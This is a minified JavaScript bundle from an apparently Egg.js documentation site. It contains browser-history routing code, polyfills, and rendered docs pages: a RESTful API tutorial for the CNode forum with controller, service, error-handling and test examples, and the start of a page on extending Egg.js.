t="POP";v.confirmTransitionTo(e,t,s,(function(n){n?w({action:t,location:e}):q(e)}))}}function q(e){var t=K.location,n=F.indexOf(t.key);-1===n&&(n=0);var a=F.indexOf(e.key);-1===a&&(a=0);var r=n-a;r&&(R=!0,H(r))}var M=g(I()),F=[M.key];function D(e){return m+y(e)}function U(e,a){var r="PUSH",l=k(e,a,f(),K.location);v.confirmTransitionTo(l,r,s,(function(e){if(e){var a=D(l),o=l.key,c=l.state;if(n)if(t.pushState({key:o,state:c},null,a),i)window.location.href=a;else{var s=F.indexOf(K.location.key),u=F.slice(0,s+1);u.push(l.key),F=u,w({action:r,location:l})}else window.location.href=a}}))}function z(e,a){var r="REPLACE",l=k(e,a,f(),K.location);v.confirmTransitionTo(l,r,s,(function(e){if(e){var a=D(l),o=l.key,c=l.state;if(n)if(t.replaceState({key:o,state:c},null,a),i)window.location.replace(a);else{var s=F.indexOf(K.location.key);-1!==s&&(F[s]=l.key),w({action:r,location:l})}else window.location.replace(a)}}))}function H(e){t.go(e)}function B(){H(-1)}function W(){H(1)}var V=0;function $(e){V+=e,1===V&&1===e?(window.addEventListener(N,L),r&&window.addEventListener(O,P)):0===V&&(window.removeEventListener(N,L),r&&window.removeEventListener(O,P))}var G=!1;function X(e){void 0===e&&(e=!1);var t=v.setPrompt(e);return G||($(1),G=!0),function(){return G&&(G=!1,$(-1)),t()}}function Q(e){var t=v.appendListener(e);return $(1),function(){$(-1),t()}}var K={length:t.length,action:"POP",location:M,createHref:D,push:U,replace:z,go:H,goBack:B,goForward:W,block:X,listen:Q};return K}var R="hashchange",_={hashbang:{encodePath:function(e){return"!"===e.charAt(0)?e:"!/"+g(e)},decodePath:function(e){return"!"===e.charAt(0)?e.substr(1):e}},noslash:{encodePath:g,decodePath:h},slash:{encodePath:h,decodePath:h}};function q(e){var t=e.indexOf("#");return-1===t?e:e.slice(0,t)}function M(){var e=window.location.href,t=e.indexOf("#");return-1===t?"":e.substring(t+1)}function F(e){window.location.hash=e}function D(e){window.location.replace(q(window.location.href)+"#"+e)}function U(e){void 0===e&&(e={}),j||Object(p["a"])(!1);var t=window.history,n=(L(),e),r=n.getUserConfirmation,l=void 0===r?S:r,o=n.hashType,i=void 0===o?"slash":o,c=e.basename?b(h(e.basename)):"",s=_[i],u=s.encodePath,d=s.decodePath;function m(){var e=d(M());return c&&(e=E(e,c)),k(e)}var g=x();function f(e){Object(a["a"])(Y,e),Y.length=t.length,g.notifyListeners(Y.location,Y.action)}var v=!1,w=null;function C(e,t){return e.pathname===t.pathname&&e.search===t.search&&e.hash===t.hash}function A(){var e=M(),t=u(e);if(e!==t)D(t);else{var n=m(),a=Y.location;if(!v&&C(a,n))return;if(w===y(n))return;w=null,T(n)}}function T(e){if(v)v=!1,f();else{var t="POP";g.confirmTransitionTo(e,t,l,(function(n){n?f({action:t,location:e}):N(e)}))}}function N(e){var t=Y.location,n=U.lastIndexOf(y(t));-1===n&&(n=0);var a=U.lastIndexOf(y(e));-1===a&&(a=0);var r=n-a;r&&(v=!0,W(r))}var O=M(),I=u(O);O!==I&&D(I);var P=m(),U=[y(P)];function z(e){var t=document.querySelector("base"),n="";return t&&t.getAttribute("href")&&(n=q(window.location.href)),n+"#"+u(c+y(e))}function H(e,t){var n="PUSH",a=k(e,void 0,void 0,Y.location);g.confirmTransitionTo(a,n,l,(function(e){if(e){var t=y(a),r=u(c+t),l=M()!==r;if(l){w=t,F(r);var o=U.lastIndexOf(y(Y.location)),i=U.slice(0,o+1);i.push(t),U=i,f({action:n,location:a})}else f()}}))}function B(e,t){var n="REPLACE",a=k(e,void 0,void 0,Y.location);g.confirmTransitionTo(a,n,l,(function(e){if(e){var t=y(a),r=u(c+t),l=M()!==r;l&&(w=t,D(r));var o=U.indexOf(y(Y.location));-1!==o&&(U[o]=t),f({action:n,location:a})}}))}function W(e){t.go(e)}function V(){W(-1)}function $(){W(1)}var G=0;function X(e){G+=e,1===G&&1===e?window.addEventListener(R,A):0===G&&window.removeEventListener(R,A)}var Q=!1;function K(e){void 0===e&&(e=!1);var t=g.setPrompt(e);return Q||(X(1),Q=!0),function(){return Q&&(Q=!1,X(-1)),t()}}function J(e){var t=g.appendListener(e);return X(1),function(){X(-1),t()}}var Y={length:t.length,action:"POP",location:P,createHref:z,push:H,replace:B,go:W,goBack:V,goForward:$,block:K,listen:J};return Y}function z(e,t,n){return Math.min(Math.max(e,t),n)}function H(e){void 0===e&&(e={});var t=e,n=t.getUserConfirmation,r=t.initialEntries,l=void 0===r?["/"]:r,o=t.initialIndex,i=void 0===o?0:o,c=t.keyLength,s=void 0===c?6:c,u=x();function d(e){Object(a["a"])(A,e),A.length=A.entries.length,u.notifyListeners(A.location,A.action)}function m(){return Math.random().toString(36).substr(2,s)}var p=z(i,0,l.length-1),h=l.map((function(e){return k(e,void 0,"string"===typeof e?m():e.key||m())})),g=y;function f(e,t){var a="PUSH",r=k(e,t,m(),A.location);u.confirmTransitionTo(r,a,n,(function(e){if(e){var t=A.index,n=t+1,l=A.entries.slice(0);l.length>n?l.splice(n,l.length-n,r):l.push(r),d({action:a,location:r,index:n,entries:l})}}))}function E(e,t){var a="REPLACE",r=k(e,t,m(),A.location);u.confirmTransitionTo(r,a,n,(function(e){e&&(A.entries[A.index]=r,d({action:a,location:r}))}))}function b(e){var t=z(A.index+e,0,A.entries.length-1),a="POP",r=A.entries[t];u.confirmTransitionTo(r,a,n,(function(e){e?d({action:a,location:r,index:t}):d()}))}function v(){b(-1)}function w(){b(1)}function j(e){var t=A.index+e;return t>=0&&t<A.entries.length}function S(e){return void 0===e&&(e=!1),u.setPrompt(e)}function C(e){return u.appendListener(e)}var A={length:h.length,action:"POP",location:h[p],index:p,entries:h,createHref:g,push:f,replace:E,go:b,goBack:v,goForward:w,canGo:j,block:S,listen:C};return A}},AJN3:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./core/development"},"\u672c\u5730\u5f00\u53d1")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./core/unittest"},"\u5355\u5143\u6d4b\u8bd5")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./core/deployment"},"\u5e94\u7528\u90e8\u7f72")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./core/logger"},"\u65e5\u5fd7")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./core/httpclient"},"HttpClient")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./core/cookie-and-session"},"Cookie \u4e0e Session")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./core/cluster-and-ipc"},"\u591a\u8fdb\u7a0b\u6a21\u578b\u548c\u8fdb\u7a0b\u95f4\u901a\u8baf")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./core/view"},"View \u6a21\u677f\u6e32\u67d3")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./core/error-handling"},"\u5f02\u5e38\u5904\u7406")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./core/security"},"\u5b89\u5168")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./core/i18n"},"\u56fd\u9645\u5316\uff08I18n\uff09")))))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(o,{demos:n})}},ALk6:function(e,t,n){var a=n("Xdqv"),r=/#|\.prototype\./,l=function(e,t){var n=i[o(e)];return n==s||n!=c&&("function"==typeof t?a(t):!!t)},o=l.normalize=function(e){return String(e).replace(r,".").toLowerCase()},i=l.data={},c=l.NATIVE="N",s=l.POLYFILL="P";e.exports=l},ANeZ:function(e,t,n){var a=n("0mt+"),r=Math.min,l=Math.max;a({target:"Math",stat:!0},{clamp:function(e,t,n){return r(n,l(t,e))}})},AOzO:function(e,t,n){var a=n("m4/z"),r=n("AAg8");e.exports=a?r:function(e){return Map.prototype.entries.call(e)}},AaXQ:function(e,t){var n={}.toString;e.exports=function(e){return n.call(e).slice(8,-1)}},AbF8:function(e,t,n){"use strict";var a=n("rdCR"),r=n("+0HW");e.exports=a?{}.toString:function(){return"[object "+r(this)+"]"}},AcHn:function(e,t,n){var a=n("W5/F"),r=n("tS9j");e.exports=function(e){return a(r(e))}},"AzF/":function(e,t,n){var a=n("A0UU"),r=n("XExY"),l=n("31yA"),o=n("1xGk"),i=n("fJSU"),c=n("lz/I"),s=c.get,u=c.enforce,d=String(String).split("String");(e.exports=function(e,t,n,i){var c=!!i&&!!i.unsafe,s=!!i&&!!i.enumerable,m=!!i&&!!i.noTargetGet;"function"==typeof n&&("string"!=typeof t||l(n,"name")||r(n,"name",t),u(n).source=d.join("string"==typeof t?t:"")),e!==a?(c?!m&&e[t]&&(s=!0):delete e[t],s?e[t]=n:r(e,t,n)):s?e[t]=n:o(t,n)})(Function.prototype,"toString",(function(){return"function"==typeof this&&s(this).source||i(this)}))},"B/O9":function(e,t,n){var a=n("WM7W");a("toPrimitive")},B0ME:function(e,t,n){t.nextTick=function(e){var t=Array.prototype.slice.call(arguments);t.shift(),setTimeout((function(){e.apply(null,t)}),0)},t.platform=t.arch=t.execPath=t.title="browser",t.pid=1,t.browser=!0,t.env={},t.argv=[],t.binding=function(e){throw new Error("No such module. (Possibly not yet loaded)")},function(){var e,a="/";t.cwd=function(){return a},t.chdir=function(t){e||(e=n("ACiY")),a=e.resolve(t,a)}}(),t.exit=t.kill=t.umask=t.dlopen=t.uptime=t.memoryUsage=t.uvCounters=function(){},t.features={}},B99X:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"Web frameworks are widely used for providing interfaces to the client through Web services. Let's use an example ",r.a.createElement(l["Link"],{to:"https://cnodejs.org/"},"CNode Club")," to show how to build ",r.a.createElement(l["Link"],{to:"https://en.wikipedia.org/wiki/REST"},"RESTful")," API using Egg."),r.a.createElement("p",null,"CNode currently use v1 interface is not fully consistent with the RESTful semantic. In the article, we will encapsulate a more RESTful semantic V2 API based on CNode V1 interface."),r.a.createElement("h2",{id:"response-formatting"},r.a.createElement(l["AnchorLink"],{to:"#response-formatting","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Response Formatting"),r.a.createElement("p",null,"Designing a RESTful-style API, we will identify the status of response by the response status code, keeping the response body simply and only the interface data is returned. A example of ",r.a.createElement("code",null,"topics")," is shown below:"),r.a.createElement("h3",{id:"get-topics-list"},r.a.createElement(l["AnchorLink"],{to:"#get-topics-list","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Get topics list"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"GET /api/v2/topics")),r.a.createElement("li",null,"status code: 200"),r.a.createElement("li",null,"response body:")),r.a.createElement(o["a"],{code:'[\n  {\n    "id": "57ea257b3670ca3f44c5beb6",\n    "author_id": "541bf9b9ad60405c1f151a03",\n    "tab": "share",\n    "content": "content",\n    "last_reply_at": "2017-01-11T13:32:25.089Z",\n    "good": false,\n    "top": true,\n    "reply_count": 155,\n    "visit_count": 28176,\n    "create_at": "2016-09-27T07:53:31.872Z"\n  },\n  {\n    "id": "57ea257b3670ca3f44c5beb6",\n    "author_id": "541bf9b9ad60405c1f151a03",\n    "tab": "share",\n    "content": "content",\n    "title": "Finished Rewriting of Let\'s Learning Node.js Together",\n    "last_reply_at": "2017-01-11T10:20:56.496Z",\n    "good": false,\n    "top": true,\n    "reply_count": 193,\n    "visit_count": 47633\n  }\n]',lang:"json"}),r.a.createElement("h3",{id:"retrieve-one-topic"},r.a.createElement(l["AnchorLink"],{to:"#retrieve-one-topic","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Retrieve One Topic"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"GET /api/v2/topics/57ea257b3670ca3f44c5beb6")),r.a.createElement("li",null,"status code: 200"),r.a.createElement("li",null,"response body:")),r.a.createElement(o["a"],{code:'{\n  "id": "57ea257b3670ca3f44c5beb6",\n  "author_id": "541bf9b9ad60405c1f151a03",\n  "tab": "share",\n  "content": "content",\n  "title": "Finished Rewriting of Let\'s Learning Node.js Together",\n  "last_reply_at": "2017-01-11T10:20:56.496Z",\n  "good": false,\n  "top": true,\n  "reply_count": 193,\n  "visit_count": 47633\n}',lang:"json"}),r.a.createElement("h3",{id:"create-topics"},r.a.createElement(l["AnchorLink"],{to:"#create-topics","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Create Topics"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"POST /api/v2/topics")),r.a.createElement("li",null,"status code: 201"),r.a.createElement("li",null,"response body:")),r.a.createElement(o["a"],{code:'{\n  "topic_id": "57ea257b3670ca3f44c5beb6"\n}',lang:"json"}),r.a.createElement("h3",{id:"update-topics"},r.a.createElement(l["AnchorLink"],{to:"#update-topics","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Update Topics"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"PUT /api/v2/topics/57ea257b3670ca3f44c5beb6")),r.a.createElement("li",null,"status code: 204"),r.a.createElement("li",null,"response body: null")),r.a.createElement("h3",{id:"error-handling"},r.a.createElement(l["AnchorLink"],{to:"#error-handling","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Error Handling"),r.a.createElement("p",null,"When an error is occurring, 4xx status code is returned if occurred by client-side request parameters and 5xx status code is returned if occurred by server-side logic processing. All error objects are used as the description for status exceptions."),r.a.createElement("p",null,"For example, passing invalided parameters from the client may return a response with status code 422, the response body as shown below:"),r.a.createElement(o["a"],{code:'{\n  "error": "Validation Failed",\n  "detail": [\n    { "message": "required", "field": "title", "code": "missing_field" }\n  ]\n}',lang:"json"}),r.a.createElement("h2",{id:"getting-started"},r.a.createElement(l["AnchorLink"],{to:"#getting-started","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Getting Started"),r.a.createElement("p",null,"After interface convention, we begin to create a RESTful API."),r.a.createElement("h3",{id:"application-initialization"},r.a.createElement(l["AnchorLink"],{to:"#application-initialization","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Application Initialization"),r.a.createElement("p",null,"Initializes the application using ",r.a.createElement("code",null,"npm")," in the ",r.a.createElement(l["Link"],{to:"../intro/quickstart"},"quickstart")),r.a.createElement(o["a"],{code:"$ mkdir cnode-api && cd cnode-api\n$ npm init egg --type=simple\n$ npm i",lang:"bash"}),r.a.createElement("h3",{id:"enable-validate-plugin"},r.a.createElement(l["AnchorLink"],{to:"#enable-validate-plugin","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Enable validate plugin"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-validate"},"egg-validate")," is used to present the validate plugin."),r.a.createElement(o["a"],{code:"// config/plugin.js\nexports.validate = {\n  enable: true,\n  package: 'egg-validate',\n};",lang:"js"}),r.a.createElement("h3",{id:"router-registry"},r.a.createElement(l["AnchorLink"],{to:"#router-registry","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Router Registry"),r.a.createElement("p",null,"First of all, we follower previous design to register ",r.a.createElement(l["Link"],{to:"../basics/router"},"router"),". The framework provides a simply way to create a RESTful-style router and mapping the resources to the corresponding controllers."),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  app.router.resources('topics', '/api/v2/topics', app.controller.topics);\n};",lang:"js"}),r.a.createElement("p",null,"Mapping the 'topics' resource's CRUD interfaces to the ",r.a.createElement("code",null,"app/controller/topics.js")," using ",r.a.createElement("code",null,"app.resources")),r.a.createElement("h3",{id:"developing-controller"},r.a.createElement(l["AnchorLink"],{to:"#developing-controller","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Developing Controller"),r.a.createElement("p",null,"In ",r.a.createElement(l["Link"],{to:"../basics/controller"},"controller"),", we only need to implement the interface convention of ",r.a.createElement("code",null,"app.resources")," ",r.a.createElement(l["AnchorLink"],{to:"../basics/router#RESTful-style-URL-definition"},"RESTful style URL definition"),". For example, creating a 'topics' interface:"),r.a.createElement(o["a"],{code:"// app/controller/topics.js\nconst Controller = require('egg').Controller;\n\n// defining the rule of request parameters\nconst createRule = {\n  accesstoken: 'string',\n  title: 'string',\n  tab: { type: 'enum', values: ['ask', 'share', 'job'], required: false },\n  content: 'string',\n};\n\nclass TopicController extends Controller {\n  async create() {\n    const ctx = this.ctx;\n    // validate the `ctx.request.body` with the expected format\n    // status = 422 exception will be thrown if not passing the parameter validation\n    ctx.validate(createRule, ctx.request.body);\n    // call service to create a topic\n    const id = await ctx.service.topics.create(ctx.request.body);\n    // configure the response body and status code\n    ctx.body = {\n      topic_id: id,\n    };\n    ctx.status = 201;\n  }\n}\nmodule.exports = TopicController;",lang:"js"}),r.a.createElement("p",null,"As shown above, a Controller mainly implements the following logic:"),r.a.createElement("ol",null,r.a.createElement("li",null,"call the validate function to validate the request parameters"),r.a.createElement("li",null,"create a topic by calling service encapsulates business logic using the validated parameters"),r.a.createElement("li",null,"configure the status code and context according to the interface convention")),r.a.createElement("h3",{id:"developing-service"},r.a.createElement(l["AnchorLink"],{to:"#developing-service","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Developing Service"),r.a.createElement("p",null,"We will more focus on writing effective business logic in ",r.a.createElement(l["Link"],{to:"../basics/service"},"service"),"."),r.a.createElement(o["a"],{code:"// app/service/topics.js\nconst Service = require('egg').Service;\n\nclass TopicService extends Service {\n  constructor(ctx) {\n    super(ctx);\n    this.root = 'https://cnodejs.org/api/v1';\n  }\n\n  async create(params) {\n    // call CNode V1 API\n    const result = await this.ctx.curl(`${this.root}/topics`, {\n      method: 'post',\n      data: params,\n      dataType: 'json',\n      contentType: 'json',\n    });\n    // check whether the call was successful, throws an exception if it fails\n    this.checkSuccess(result);\n    // return the id of topis\n    return result.data.topic_id;\n  }\n\n  // Encapsulated a uniform check function, can be reused in query, create, update and such on in service\n  checkSuccess(result) {\n    if (result.status !== 200) {\n      const errorMsg =\n        result.data && result.data.error_msg\n          ? result.data.error_msg\n          : 'unknown error';\n      this.ctx.throw(result.status, errorMsg);\n    }\n    if (!result.data.success) {\n      // remote response error\n      this.ctx.throw(500, 'remote response error', { data: result.data });\n    }\n  }\n}\n\nmodule.exports = TopicService;",lang:"js"}),r.a.createElement("p",null,"After developing the Service of topic creation, an interface have been completed from top to bottom."),r.a.createElement("h3",{id:"unified-error-handling"},r.a.createElement(l["AnchorLink"],{to:"#unified-error-handling","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Unified Error Handling"),r.a.createElement("p",null,"Normal business logic has been completed, but exceptions have not yet been processed. Controller and Service may throw an exception as the previous coding, so it is recommended that throwing an exception to interrupt if passing invalided parameters from the client or calling the back-end service with exception."),r.a.createElement("ul",null,r.a.createElement("li",null,"use Controller ",r.a.createElement("code",null,"this.ctx.validate()")," to validate the parameters, throw exception if it fails."),r.a.createElement("li",null,"call Service ",r.a.createElement("code",null,"this.ctx.curl()")," to access CNode API, may throw server exception due to network problems."),r.a.createElement("li",null,"an exception also will be thrown after Service is getting the response of calling failure from CNode API.")),r.a.createElement("p",null,"Default error handling is provided but might be inconsistent as the interface convention previously. We need to implement a unified error-handling middleware to handle the errors."),r.a.createElement("p",null,"Create a file ",r.a.createElement("code",null,"error_handler.js")," under ",r.a.createElement("code",null,"app/middleware")," directory to create a new ",r.a.createElement(l["Link"],{to:"../basics/middleware"},"middleware")),r.a.createElement(o["a"],{code:"// app/middleware/error_handler.js\nmodule.exports = () => {\n  return async function errorHandler(ctx, next) {\n    try {\n      await next();\n    } catch (err) {\n      // All exceptions will trigger an error event on the app and the error log will be recorded\n      ctx.app.emit('error', err, ctx);\n\n      const status = err.status || 500;\n      // error 500 not returning to client when in the production environment because it may contain sensitive information\n      const error =\n        status === 500 && ctx.app.config.env === 'prod'\n          ? 'Internal Server Error'\n          : err.message;\n\n      // Reading from the properties of error object and set it to the response\n      ctx.body = { error };\n      if (status === 422) {\n        ctx.body.detail = err.errors;\n      }\n      ctx.status = status;\n    }\n  };\n};",lang:"js"}),r.a.createElement("p",null,"We can catch all exceptions and follow the expected format to encapsulate the response through the middleware. It can be loaded into application using configuration file (",r.a.createElement("code",null,"config/config.default.js"),")"),r.a.createElement(o["a"],{code:"// config/config.default.js\nmodule.exports = {\n  // load the errorHandler middleware\n  middleware: ['errorHandler'],\n  // only takes effect on URL prefix with '/api'\n  errorHandler: {\n    match: '/api',\n  },\n};",lang:"js"}),r.a.createElement("h2",{id:"testing"},r.a.createElement(l["AnchorLink"],{to:"#testing","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Testing"),r.a.createElement("p",null,"Completing the coding just the first step, furthermore we need to add ",r.a.createElement(l["Link"],{to:"../core/unittest"},"Unit Test")," to the code."),r.a.createElement("h3",{id:"controller-testing"},r.a.createElement(l["AnchorLink"],{to:"#controller-testing","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Controller Testing"),r.a.createElement("p",null,"Let's start writing the unit test for the Controller. We can simulate the implementation of the Service layer in an appropriate way because the most important part is to test the logic as for Controller. And mocking up the Service layer according the convention of interface, so we can develop layered testing because the Service layer itself can also covered by Service unit test."),r.a.createElement(o["a"],{code:"const { app, mock, assert } = require('egg-mock/bootstrap');\n\ndescribe('test/app/controller/topics.test.js', () => {\n  // test the response of passing the error parameters\n  it('should POST /api/v2/topics/ 422', () => {\n    app.mockCsrf();\n    return app\n      .httpRequest()\n      .post('/api/v2/topics')\n      .send({\n        accesstoken: '123',\n      })\n      .expect(422)\n      .expect({\n        error: 'Validation Failed',\n        detail: [\n          { message: 'required', field: 'title', code: 'missing_field' },\n          { message: 'required', field: 'content', code: 'missing_field' },\n        ],\n      });\n  });\n\n  // mock up the service layer and test the response of normal request\n  it('should POST /api/v2/topics/ 201', () => {\n    app.mockCsrf();\n    app.mockService('topics', 'create', 123);\n    return app\n      .httpRequest()\n      .post('/api/v2/topics')\n      .send({\n        accesstoken: '123',\n        title: 'title',\n        content: 'hello',\n      })\n      .expect(201)\n      .expect({\n        topic_id: 123,\n      });\n  });\n});",lang:"js"}),r.a.createElement("p",null,"As the Controller testing above, we create an application using ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-mock"},"egg-mock")," and simulate the client to send request through ",r.a.createElement(l["Link"],{to:"https://github.com/visionmedia/supertest"},"SuperTest"),". In the testing, we also simulate the response from Service layer to test the processing logic of Controller layer"),r.a.createElement("h3",{id:"service-testing"},r.a.createElement(l["AnchorLink"],{to:"#service-testing","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Service Testing"),r.a.createElement("p",null,"Unit Test of Service layer may focus on the coding logic. ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-mock"},"egg-mock")," provides a quick method to test the Service by calling the test method in the Service, and SuperTest to simulate the client request is no longer needed."),r.a.createElement(o["a"],{code:"const { app, mock, assert } = require('egg-mock/bootstrap');\n\ndescribe('test/app/service/topics.test.js', () => {\n  let ctx;\n\n  beforeEach(() => {\n    // create a global context object so that can call the service function on a ctx object\n    ctx = app.mockContext();\n  });\n\n  describe('create()', () => {\n    it('should create failed by accesstoken error', async () => {\n      try {\n        // calling service method on ctx directly\n        await ctx.service.topics.create({\n          accesstoken: 'hello',\n          title: 'title',\n          content: 'content',\n        });\n      } catch (err) {\n        assert(err.status === 401);\n        assert(err.message === 'error accessToken');\n      }\n      throw 'should not run here';\n    });\n\n    it('should create success', async () => {\n      // not affect the normal operation of CNode by simulating the interface calling of CNode based on interface convention\n      // app.mockHttpclient method can easily simulate the appliation's HTTP request\n      app.mockHttpclient(`${ctx.service.topics.root}/topics`, 'POST', {\n        data: {\n          success: true,\n          topic_id: '5433d5e4e737cbe96dcef312',\n        },\n      });\n\n      const id = await ctx.service.topics.create({\n        accesstoken: 'hello',\n        title: 'title',\n        content: 'content',\n      });\n      assert(id === '5433d5e4e737cbe96dcef312');\n    });\n  });\n});",lang:"js"}),r.a.createElement("p",null,"In the testing of Service layer above, we create a Context object using the ",r.a.createElement("code",null,"app.createContext()")," which provided by egg-mock and call the Service method on Context object to test directly. It can use ",r.a.createElement("code",null,"app.mockHttpclient()")," to simulate the response of calling HTTP request, which allows us to focus on the logic testing of Service layer without the impact of environment."),r.a.createElement("hr",null),r.a.createElement("p",null,"See the full example at ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples/tree/master/cnode-api"},"eggjs/examples/cnode-api"),".")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},BC1W:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"Egg.js is extensible and it provides multiple extension points to enhance the functionality of itself:"),r.a.createElement("ul",null,r.a.createElement("li",null,"Application"),r.a.createElement("li",null,"Context"),r.a.createElement("li",null,"Request"),r.a.createElement("li",null,"Response"),r.a.createElement("li",null,"Helper")),r.a.createElement("p",null,"We could use the extension APIs to help us to develop, or extend the objects given above to enhance the functionality of egg as well while programming."),r.a.createElement("h2",{id:"application"},r.a.createElement(l["AnchorLink"],{to:"#application","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Application"),r.a.createElement("p",null,"The object ",r.a.createElement("code",null,"app")," is just the same aspect as the global application object in Koa. There should be only one ",r.a.createElement("code",null,"app")," in your application, and it will be created by egg when the application is started."),r.a.createElement("h3",{id:"access-method"},r.a.createElement(l["AnchorLink"],{to:"#access-method","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Access Method"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("p",null,r.a.createElement("code",null,"ctx.app"))),r.a.createElement("li",null,r.a.createElement("p",null,"You can access the Application object by using ",r.a.createElement("code",null,"this.app")," in Controller, Middleware, Helper, Service. For instance, ",r.a.createElement("code",null,"this.app.config")," will help you access the Config object.")),r.a.createElement("li",null,r.a.createElement("p",null,"The ",r.a.createElement("code",null,"app")," object would be injected into the entry function as the first argument in ",r.a.createElement("code",null,"app.js"),", like this:"),r.a.createElement(o["a"],{code:"// app.js\nmodule.exports = (app) => {\n  // here you can use the app object\n};",lang:"js"}))),r.a.createElement("h3",{id:"how-to-extend"},r.a.createElement(l["AnchorLink"],{to:"#how-to-extend","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"How to Extend"),r.a.createElement("p",null,"Egg will merge the object defined in ",r.a.createElement("code",null,"app/extend/application.js")," with the prototype of Application object in Koa, then generate object ",r.a.createElement("code",null,"app")," which is based on the extended prototype when application is started."),r.a.createElement("h4",{id:"extend-methods"},r.a.createElement(l["AnchorLink"],{to:"#extend-methods","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Extend Methods"),r.a.createElement("p",null,"If we want to create a method ",r.a.createElement("code",null,"app.foo()"),", we can do it like this: \uff1a"),r.a.createElement(o["a"],{code:"// app/extend/application.js\nmodule.exports = {\n  foo(param) {\n    // `this` points to the object app, you can access other methods or property of app with this\n  },\n};",lang:"js"}),r.a.createElement("h4",{id:"extend-properties"},r.a.createElement(l["AnchorLink"],{to:"#extend-properties","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Extend Properties"),r.a.createElement("p",null,"Generally speaking, the calculation of properties only need to be done once, therefore we have to do some cache, otherwise it will degrade performance of the app as too much calculation would be going to do when accessing those properties several times."),r.a.createElement("p",null,"So, it's recommended to use Symbol + Getter."),r.a.createElement("p",null,"For example, if we would like to add a Getter property ",r.a.createElement("code",null,"app.bar"),":"),r.a.createElement(o["a"],{code:"// app/extend/application.js\nconst BAR = Symbol('Application#bar');\n\nmodule.exports = {\n  get bar() {\n    // `this` points to the app object, you can access other methods or property of app with this\n    if (!this[BAR]) {\n      // It should be more complex in real situation\n      this[BAR] = this.config.xx + this.config.yy;\n    }\n    return this[BAR];\n  },\n};",lang:"js"}),r.a.createElement("h2",{id:"context"},r.a.createElement(l["AnchorLink"],{to:"#context","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Context"),r.a.createElement("p",null,"Context means the context in Koa, which is a ",r.a.createElement("strong",null,"Request Level")," object. That is to say, every request from client will generate an Context instance. We usually write Context as ",r.a.createElement("code",null,"ctx")," in short. In all the doc, both Context and ",r.a.createElement("code",null,"ctx")," means the context object in 